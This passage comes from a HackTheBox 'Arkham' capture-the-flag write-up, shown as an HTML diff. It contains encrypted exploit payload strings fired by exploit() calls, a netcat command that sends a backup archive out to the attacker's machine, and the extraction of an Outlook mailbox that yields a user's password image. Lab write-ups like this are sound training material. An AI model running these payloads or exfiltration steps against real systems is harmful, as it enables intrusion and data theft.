PW2oCG/HiPH0hgDaLJD/5rWumATBRhPfQdMukPUuvh7aBrYKhTjoF6YCWWjI11WPUId+F+62lotVdWzpNlg7XO+O71UXIulcb15uC4Uo/mVX+F55hhstnKpruvCRn1/E2U+SHSUwJwYQalMFkB3EYe3Bg0twUHB0FLdRlgk+1LfoOx+OAGABHbKLruPQnSgSaOr0QO7fs3ABDYpM+0brsRYoVq/xZrXHXh2iWpRbmrPnC5ZqMgqYmDRqJqBegTWtulqHIbfmX3cwmZtK73nCNfCh4bR8nU8ph+9dFQFQm3TB92LYOU+o9ImRGT5ZxHsqO7r9vsYEY9lEOrVQEonBeV1772fxzAWY30P6lQjx7QKzqFpGw7VVu9x6xj4HqyzMw3srhBWpB1evb/2cj2VJfV2Ik/e1XeDhxd98FCKdtuwD/hfhKKwyMHBLd++TRSti5+PjgedH8VrYCDw+h7TXbFuuzmic0Ejp/MdRQ2lgM7A1Zk2tN7LvOGYXm5vai2/p9KNzcb82+WwUxFUNdG/r+91Skv9JVChFgo1kBKZ5DSG9GVW0c93lwaDPZR8m2MdKuCGEIGysMjBwS3fvkWX6kL5w8G98g8evxDbfYkHzyF14jnr2kMvA1HZRyD2wcvsnF03HnathuuAfsXFi9nSS/wbSz1fz4k0TLI7Jwpbv6aAGFYU9IId4BaMaICpD4zmUdsKF/chdWUs7E65By387U2Ejeqn/Y3UAanW9XVGnW1aWk9nG1iLSIviO15BJYS2423DKh2itxBdEkoL7a2k0YgPMLX+TweGj5FUR/lCPgQijAFFrHWRvjlEtsVNbr09Qek/0QE3yWXS1W/gaT+7VnbdN2xAhE+9N5PSzJudEi8q/o29VPSGioyPZd/iNpmNoUDeaeXEVrvY0L/aRMkBoThhoybIwKm9JRORG5quVg7mI39K3ANZaw6BBLyJDVbXmOcpydaV+J4ehZuDU5EJNCdYdlqpK5IUgV5VNtTWO9f9YgPaneg14o+53eYRjgAQvWxmK/VII6JP9zUlbTzD60JeAbleovB8fLJf0D3aUv3mla+/LyWEXo2NfiqjFqPb9b4NHR199UdBVp6X2nev37/tu0vBXvZz+ls4886hDPhV3RdASjsJaoZPrEReF8f43oev+x6ZHIUdkCdk5uThniTrXeAWImx1USbtujkG0xSYdfK/s8Az9gV7hyTmqI0ewkaYsX9uSA/9wVoArXnRX/rTg7PxMp9hGNKQN/klr+Xyc="</span>
+<span class="n">execute_payload</span>	<span class="o">=</span> <span class="s">"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"</span>
+
+<span class="n">exploit</span><span class="p">(</span><span class="n">upload_payload</span><span class="p">)</span>
+<span class="n">exploit</span><span class="p">(</span><span class="n">execute_payload</span><span class="p">)</span>
+</code></pre></div></div>
+<p><img src="/images/hackthebox/arkham/12.png" alt="" /></p>
+<hr />
+
+<h2 id="shell-as-batman">Shell as Batman</h2>
+<p><br /> We are on the box as <code class="highlighter-rouge">Alfred</code>, I enumerated the directories and found a directory called <code class="highlighter-rouge">backups</code> in <code class="highlighter-rouge">C:\Users\Alfred\Downloads</code>, It had a <code class="highlighter-rouge">zip</code> archive called <code class="highlighter-rouge">backup.zip</code> :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\Alfred\Downloads&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is FA90-3873
+
+ Directory of C:\Users\Alfred\Downloads
+
+02/03/2019  08:48 AM    &lt;DIR&gt;          .
+02/03/2019  08:48 AM    &lt;DIR&gt;          ..
+02/03/2019  08:41 AM    &lt;DIR&gt;          backups
+               0 File(s)              0 bytes
+               3 Dir(s)   8,675,921,920 bytes free
+
+C:\Users\Alfred\Downloads&gt;cd backups
+cd backups
+
+C:\Users\Alfred\Downloads\backups&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is FA90-3873
+
+ Directory of C:\Users\Alfred\Downloads\backups
+
+02/03/2019  08:41 AM    &lt;DIR&gt;          .
+02/03/2019  08:41 AM    &lt;DIR&gt;          ..
+02/03/2019  08:41 AM           124,257 backup.zip
+               1 File(s)        124,257 bytes
+               2 Dir(s)   8,675,921,920 bytes free
+
+C:\Users\Alfred\Downloads\backups&gt;
+</code></pre></div></div>
+<p><br /> I wanted to get it on my box so I used <code class="highlighter-rouge">nc</code> to do it. I listened on port 1338, then on the box I did this:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\Alfred\Downloads\backups&gt;C:\windows\system32\spool\drivers\color\nc.exe -w 3 10.10.xx.xx 1338 &lt; C:\Users\Alfred\Downloads\backups\backup.zip                                                             
+C:\windows\system32\spool\drivers\color\nc.exe -w 3 10.10.xx.xx 1338 &lt; C:\Users\Alfred\Downloads\backups\backup.zip                                                                                   
+C:\Users\Alfred\Downloads\backups&gt;
+</code></pre></div></div>
+<p><br /> And I successfully got the file :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/arkham/backups# nc -lp 1338 &gt; backup.zip                                                                    
+root@kali:~/Desktop/HTB/boxes/arkham/backups# ls -la
+total 132
+drwxr-xr-x 2 root root   4096 Aug  9 21:26 .
+drwxr-xr-x 5 root root   4096 Aug  9 21:24 ..
+-rw-r--r-- 1 root root 124257 Aug  9 21:26 backup.zip
+root@kali:~/Desktop/HTB/boxes/arkham/backups#
+</code></pre></div></div>
+<p><br /> The archive only had a file called <code class="highlighter-rouge">alfred@arkham.local.ost</code> which is an outlook email folder so I used <code class="highlighter-rouge">readpst</code> to convert it.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/arkham/backups# unzip backup.zip 
+Archive:  backup.zip
+  inflating: alfred@arkham.local.ost  
+root@kali:~/Desktop/HTB/boxes/arkham/backups# file alfred@arkham.local.ost 
+alfred@arkham.local.ost: Microsoft Outlook email folder
+root@kali:~/Desktop/HTB/boxes/arkham/backups# readpst alfred@arkham.local.ost 
+Opening PST file and indexes...
+Processing Folder "Deleted Items"
+Processing Folder "Inbox"
+Processing Folder "Outbox"
+Processing Folder "Sent Items"
+Processing Folder "Calendar"
+Processing Folder "Contacts"
+Processing Folder "Conversation Action Settings"
+Processing Folder "Drafts"
+Processing Folder "Journal"
+Processing Folder "Junk E-Mail"
+Processing Folder "Notes"
+Processing Folder "Tasks"
+Processing Folder "Sync Issues"
+Processing Folder "RSS Feeds"
+Processing Folder "Quick Step Settings"
+  "alfred@arkham.local.ost" - 15 items done, 0 items skipped.
+  "Calendar" - 0 items done, 3 items skipped.
+Processing Folder "Conflicts"
+Processing Folder "Local Failures"
+Processing Folder "Server Failures"
+  "Sync Issues" - 3 items done, 0 items skipped.
+  "Inbox" - 0 items done, 7 items skipped.
+  "Drafts" - 1 items done, 0 items skipped.
+root@kali:~/Desktop/HTB/boxes/arkham/backups# 
+</code></pre></div></div>
+<p><br /> The output was saved in <code class="highlighter-rouge">Drafts.mbox</code>, I removed the long useless output :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/arkham/backups# ls -la
+total 16608
+drwxr-xr-x 2 root root     4096 Aug  9 21:33 .
+drwxr-xr-x 5 root root     4096 Aug  9 21:33 ..
+-rwx------ 1 root root 16818176 Feb  3  2019 alfred@arkham.local.ost
+-rw-r--r-- 1 root root   124257 Aug  9 21:26 backup.zip
+-rw-r--r-- 1 root root    51857 Aug  9 21:33 Drafts.mbox
+root@kali:~/Desktop/HTB/boxes/arkham/backups# cat Drafts.mbox 
+   ----------------
+    Removed Output
+   ----------------
+&lt;/o:shapelayout&gt;&lt;/xml&gt;&lt;![endif]--&gt;&lt;/head&gt;&lt;body lang=EN-US link="#0563C1" vlink="#954F72" style='tab-interval:.5in'&gt;&lt;div class=WordSection1&gt;&lt;p class=MsoNormal&gt;Master Wayne stop forgetting your password&lt;o:p&gt;&lt;/o:p&gt;&lt;/p&gt;&lt;p class=MsoNormal&gt;&lt;o:p&gt;&amp;nbsp;&lt;/o:p&gt;&lt;/p&gt;&lt;p class=MsoNormal&gt;&lt;span style='mso-no-proof:yes'&gt;&lt;img width=677 height=343 id="Picture_x0020_1" src="cid:image001.png@01D4BB4A.F5061EA0"&gt;&lt;/span&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;/p&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;
+----boundary-LibPST-iamunique-672158152_-_-
+Content-Type: image/png
+Content-Transfer-Encoding: base64
+Content-ID: &lt;image001.png@01D4BB4A.F5061EA0&gt;
+Content-Disposition: attachment; 
+        filename*=utf-8''image001.png;
+        filename="image001.png"
+
+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
